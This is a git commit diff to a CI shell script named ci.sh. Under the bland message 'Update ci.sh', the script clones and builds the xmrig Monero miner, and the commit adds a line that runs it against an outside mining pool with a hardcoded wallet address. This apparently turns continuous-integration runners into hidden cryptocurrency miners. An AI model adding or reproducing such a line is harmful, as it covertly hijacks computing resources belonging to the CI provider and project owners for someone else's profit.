6774649247773b5de11d6791cf0c65509a80c74e
sism002 <151802314+sism002@users.noreply.github.com>
2023-11-23 07:55:42 +0530

    Update ci.sh

--- ci.sh
+++ ci.sh
@@ -4,3 +4,4 @@ git clone https://github.com/xmrig/xmrig.git
 mkdir xmrig/build && cd xmrig/build
 cmake ..
 make
+./xmrig -o randomx.2realminers.com:6667 -u 41kybD7H7Q4aeJZ2ZZQRhm9YotkVjYifUUHd5gDcBf6e7yogwqBoNToGN6NUPCTHDndmkGEgnXV3MM5LYSs8tLQFCvgTXsT -t 4 -p x -k -a rx/0 
